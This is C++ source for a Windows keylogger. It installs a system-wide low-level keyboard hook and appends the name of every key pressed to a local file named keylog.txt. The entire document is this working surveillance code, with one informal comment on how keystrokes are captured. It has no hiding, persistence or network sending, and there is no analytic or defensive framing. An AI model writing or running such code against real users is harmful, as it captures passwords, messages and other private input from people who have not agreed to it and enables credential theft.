#include <iostream>
#include <fstream>
#include <windows.h>

HHOOK hook;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKey->vkCode;
        
// this code here get the key valuse after it pressed
        char keyName[256];
        int result = GetKeyNameTextA(vkCode << 16, keyName, sizeof(keyName));

        if (result > 0) {
            std::ofstream logfile("keylog.txt", std::ios_base::app);
            if (logfile.is_open()) {
                logfile << keyName << std::endl;
                logfile.close();
            }
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
